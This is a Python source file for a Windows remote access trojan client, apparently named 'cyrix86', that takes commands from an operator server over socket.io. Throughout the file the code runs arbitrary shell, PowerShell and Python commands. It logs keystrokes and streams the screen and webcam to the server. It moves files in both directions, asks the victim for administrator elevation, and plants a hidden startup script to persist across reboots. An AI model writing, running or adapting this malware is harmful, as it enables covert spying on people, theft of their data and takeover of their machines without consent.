import subprocess
import mss.tools
import keyboard
import socketio
import requests
import base64
import random
import ctypes
import time
import json
import mss
import sys
import os


ORIGIN, STARTUP, UAC = base64.b64decode(sys.argv[1]).decode().split(",")
isUac = '-UAC' if ctypes.windll.shell32.IsUserAnAdmin() else ''

ID = f'{os.environ["USERDOMAIN"]}-{os.environ["USERNAME"]}{isUac}'
USERAGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
BASEFOLDERNAME = os.path.dirname(sys.executable).split("\\")[-1]
TEMP = os.environ['TEMP']
SIO = socketio.Client()


def encoder(data):
    return base64.b64encode(json.dumps(data).encode()).decode()


def decoder(data):
    return json.loads(base64.b64decode(data).decode())


def toServer(command, value):
    if not SIO.connected: return
    SIO.emit("to-server", encoder({"id": ID, "command": command, "value": value}))


def toStream(command, value):
    try:
        requests.post(f"{ORIGIN}/tar/to-stream",
            data={"id": ID, "command": command},
            files={"file": ("a", value)},
            headers={"User-Agent": USERAGENT}
        )
    except Exception as e: 
        print(e)


def randomString(strLen):
    letters = "qwertyuiopasdfghjklzxcvbnm"
    letters += letters.upper()
    ranVal = ""
    for _ in range(strLen):
        ranVal += letters[random.randint(0, len(letters) - 1)]
    return ranVal


def getFileName(ext):
    return os.path.join(TEMP, f"{randomString(20)}.{ext}") 


def shell(command, app):
    if app: command = f"powershell {command}"

    result = subprocess.run(
        command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )

    if result.returncode == 0:
        return result.stdout
    else:
        return result.stderr


class Piano:
    def __init__(self, callback) -> None:
        self.__callback = callback

    def white(self, event):
        if event.event_type == keyboard.KEY_DOWN:
            self.__callback(event.name)

    def start(self):
        keyboard.hook(self.white)

    def stop(self):
        keyboard.unhook_all()


def shellExecutor(c, value, app):
    try:
        if value[0:3] == "cd ":
            os.chdir(value[3 : len(value)])
            toServer("cwd", os.getcwd())
        else:
            toServer(c, shell(value, app))
    except Exception as e:
        toServer(c, f"ERROR: {e}")


def screenshot(c, value):
    try:
        with mss.mss() as sct:
            if value == "1":
                filename = getFileName("jpg")
                sct.shot(output=filename)
                postFile(c, filename)
                os.remove(filename)
            else:
                monitors = sct.monitors
                for i in range(len(monitors) - 1):
                    filename = getFileName("jpg")
                    sct.shot(mon=i + 1, output=filename)
                    postFile(c, filename)
                    os.remove(filename)
    except Exception as e:
        toServer(c, f"ERROR: {e}")


def webcamSnapshot(c, value):
    try:
        import cv2
        cap = cv2.VideoCapture(int(value))
        if not cap.isOpened():
            toServer(c, "ERROR: Could not open webcam.")
            return

        ret, frame = cap.read()
        if not ret:
            toServer(c, "Error: Could not read frame.")
            return

        cap.release()
        filename = getFileName("jpg")
        cv2.imwrite(filename, frame)

        postFile(c, filename)
        os.remove(filename)
    except ImportError:
        toServer(c, "ERROR: cv not found. The installation process is going on.")
        pip('pip', "install opencv-python==4.9.0.80")
    except Exception as e:
        toServer(c, f"ERROR: {e}")


SCREENSHAREING = False
def screenShare(c, monitorIndex, value):
    try:
        global SCREENSHAREING
        if value == "start" and SCREENSHAREING == False:
            SCREENSHAREING = True
            with mss.mss() as sct:
                monitor = sct.monitors[int(monitorIndex)]
                while SCREENSHAREING:
                    print("SCREENSHAREING", SCREENSHAREING, monitorIndex)
                    image = sct.grab(monitor)
                    screen = mss.tools.to_png(image.rgb, image.size, level=9)
                    toStream(c, screen)
                    time.sleep(0.5)
        elif value == "stop" and SCREENSHAREING == True:
            SCREENSHAREING = False
    except Exception as e:
        toServer(c, f"ERROR: {e}")


WEBCAMSTREAMING = False
def webcamStream(c, value, webcam):
    try:
        import cv2
        global WEBCAMSTREAMING
        if value == "start" and WEBCAMSTREAMING == False:
            cap = cv2.VideoCapture(int(webcam))
            if not cap.isOpened():
                toServer(c, "ERROR: Could not open webcam.")
                return

            WEBCAMSTREAMING = True
            while WEBCAMSTREAMING:
                ret, frame = cap.read()
                image = cv2.imencode(".jpg", frame)[1].tobytes()
                toStream(c, image)
                time.sleep(0.5)
            cap.release()

        elif value == "stop" and WEBCAMSTREAMING == True:
            WEBCAMSTREAMING = False
    except ImportError:
        toServer(c, "ERROR: cv not found. The installation process is going on.")
        pip('pip', "install opencv-python==4.9.0.80")
    except Exception as e:
        toServer(c, f"ERROR: {e}")


AUDIOPLAYING = False
def playAudio(c, value, fileName):
    try:
        global AUDIOPLAYING
        if value == "start" and AUDIOPLAYING == False:
            if not os.path.exists(fileName):
                toServer(c, f"ERROR: file not found")
                return
            AUDIOPLAYING = True
            fileName = fileName.replace('"', "")
            if fileName.endswith(".mp3") or fileName.endswith(".wav"):
                toServer(c, "Playing in background.")
                code = f"""Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")
oPlayer.URL = "{fileName}"
oPlayer.controls.play 
While oPlayer.playState <> 1 ' 1 = Stopped
  WScript.Sleep 100
Wend
oPlayer.close"""
                player = os.path.join(TEMP, "player.vbs")
                with open(player, "w") as f:
                    f.write(code)
                shell(f'cscript "{player}"', False)
        elif value == "stop" and AUDIOPLAYING == True:
            AUDIOPLAYING = False
            shell("taskkill /F /IM cscript.exe", False)
            toServer(c, "audio stopped.")
    except Exception as e:
        toServer(c, f"ERROR: {e}")


KEYLOGGING = False
def callbacker(a):
    toServer("keystrokes", a)
piano = Piano(callbacker)
def keyStrokes(c, value):
    try:
        global KEYLOGGING, KEYLOGGINGSTATUS
        if value == "start" and KEYLOGGING == False:
            KEYLOGGING = True
            piano.start()
        elif value == "stop" and KEYLOGGING == True:
            KEYLOGGING = False
            piano.stop()
    except Exception as e:
        toServer(c, f"ERROR: {e}")

def getFile(c, url, filename):
    try:
        res = requests.get(url, headers={"User-Agent": USERAGENT})
        if res.status_code == 200:
            with open(filename, "wb") as f:
                f.write(res.content)
        toServer(c, "upload success")
    except Exception as e:
        toServer(c, f"ERROR: {e}")


def postFile(c, filename):
    try:
        requests.post(
            f"{ORIGIN}/tar?id={ID}&command={c}", files={"file": open(filename, "rb")}
        )
    except Exception as e:
        toServer(c, f"ERROR: {e}")


def notifications(c, icon, title: str, description):
    try:
        title = title.replace('"', "").replace("'", "")
        description = description.replace('"', "").replace("'", "")
        shell(
            f'''"[void] [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');$a = New-Object System.Windows.Forms.NotifyIcon;$a.Icon = [System.Drawing.SystemIcons]::Information;$a.BalloonTipIcon = '{icon}' ;$a.BalloonTipTitle = '{title}';$a.BalloonTipText = '{description}';$a.Visible = $True;$a.ShowBalloonTip(50000);"''',
            True,
        )
        toServer(c, "Success notification.")
    except Exception as e:
        toServer(c, f"ERROR: {e}")


def messageBox(c, icon, buttons, title, description):
    try:
        toServer(c, f"Success: messagebox")
        ctypes.windll.user32.MessageBoxW(0, title, description, int(buttons) | int(icon))
    except Exception as e:
        toServer(c, f"ERROR: {e}")


def uac(c):
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            res = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, f'"{sys.argv[0]}" {" ".join(sys.argv[1:])}', None, 0)
            if res == 42:
                toServer(c, f'ACCESSGRATED: goto -> {ID}-UAC')
                _exit(c)
            else:
                toServer(c, 'ERROR: ACCESSDENIED')
        else:
            toServer(c, 'ALREADY ACCESSGRATED')
    except Exception as e:
        toServer(c, f"ERROR: {e}")


def runPython(c, value):
    try:
        filename = os.path.join(TEMP, "runpython.py")
        with open(filename, "w") as f:
            f.write(value)
        toServer(c, shell(f'"{sys.executable}" -u "{filename}"', False))
    except Exception as e:
        toServer(c, f"ERROR: {e}")


def pip(c, value):
    try:
        toServer(c, shell(f'"{os.path.join(os.path.dirname(sys.executable), "Scripts", "pip")}" {value}', False))
    except Exception as e:
        toServer(c, f"ERROR: {e}")


def startup(c, value):
    startupFile = os.path.join(
        os.environ["APPDATA"],
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup",
        f"{value}.vbs",
    )
    try:
        with open(startupFile, "w",) as f:
            f.write(f'''' python installer
CreateObject("WScript.Shell").run "cmd /c ""cd %APPDATA%\\{BASEFOLDERNAME} & python -m cyrix86 {sys.argv[1]}""", 0''')
        if os.path.exists(startupFile):
            toServer(c, "success.")
        else:
            toServer(c, "ERROR: startup not installed.")
    except Exception as e:
        toServer(c, f"ERROR: {e}")


def _exit(c):
    SIO.disconnect()
    exit(0)

@SIO.on("connect")
def onConnect():
    SIO.emit("connected", encoder({"id": ID, "type": True, "cwd": os.getcwd()}))

@SIO.on("disconnect")
def onDisConnect():
    pass

@SIO.on(f"to-{ID}")
def executor(data):
    data = json.loads(base64.b64decode(data).decode())
    command = data['command']
    if command == "cmd":
        shellExecutor(command, data['value'], False)
    elif command == "powershell":
        shellExecutor(command, data['value'], True)
    elif command == "screenshot":
        screenshot(command, data['screen'])
    elif command == "webcam-snapshot":
        webcamSnapshot(command, data['value'])
    elif command == "screenshare":
        screenShare(command, data['monitor'], data['value'])
    elif command == "webcamstream":
        webcamStream(command, data['value'], data['webcam'])
    elif command == "playaudio":
        playAudio(command, data['value'], data['filename'])
    elif command == "keystrokes":
        keyStrokes(command, data['value'])
    elif command == "upload":
        getFile(command, data['url'], data['filename'])
    elif command == "download":
        postFile(command, data['filename'])
    elif command == "notifications":
        notifications(command, data['icon'], data['title'], data['content'])
    elif command == "messagebox":
        messageBox(command, data['icon'], data['buttons'], data['title'], data['content'])
    elif command == "uac": 
        uac(command)
    elif command == "python":
        runPython(command, data['value'])
    elif command == "pip":
        pip(command, data['value'])
    elif command == "startup":
        startup(command, data['value'])
    elif command == "exit":
        _exit(command)

def main():
    if STARTUP == 'True': startup("startup", "python")
    if UAC == 'True': uac("uac")
    try:
        SIO.connect(ORIGIN, wait_timeout=10)
        SIO.wait()
    except:
        time.sleep(4)
        main()

if __name__ == "__main__":
    main()